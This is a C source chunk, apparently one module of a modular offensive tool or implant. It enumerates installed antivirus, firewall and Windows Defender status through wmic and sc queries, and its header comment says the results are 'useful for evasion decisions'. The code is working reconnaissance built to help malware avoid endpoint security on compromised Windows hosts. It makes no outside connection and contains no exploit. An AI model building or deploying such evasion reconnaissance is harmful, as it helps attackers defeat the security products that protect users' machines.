// chunk: collectors/security_products
// depends: core/emit_buffer, core/run_cmd
// provides: collect_security_products
// note: LOLBin AV/EDR detection via wmic — useful for evasion decisions

#ifndef CHUNK_SECURITY_PRODUCTS
#define CHUNK_SECURITY_PRODUCTS

static void collect_security_products(void) {
    emitf("=== SECURITY PRODUCTS ===\r\n");

    char buf[8192] = {0};
    DWORD buf_len = 0;
    run_cmd("cmd /c wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /format:list 2>nul",
            buf, sizeof(buf), &buf_len);
    if (buf_len > 0) emitf("AV:\r\n%.*s", (int)buf_len, buf);

    buf[0] = '\0'; buf_len = 0;
    run_cmd("cmd /c wmic /namespace:\\\\root\\SecurityCenter2 path FirewallProduct get displayName,productState /format:list 2>nul",
            buf, sizeof(buf), &buf_len);
    if (buf_len > 0) emitf("FW:\r\n%.*s", (int)buf_len, buf);

    buf[0] = '\0'; buf_len = 0;
    run_cmd("cmd /c sc query windefend | findstr STATE", buf, sizeof(buf), &buf_len);
    if (buf_len > 0) emitf("Defender: %.*s", (int)buf_len, buf);

    emitf("\r\n");
}

#endif
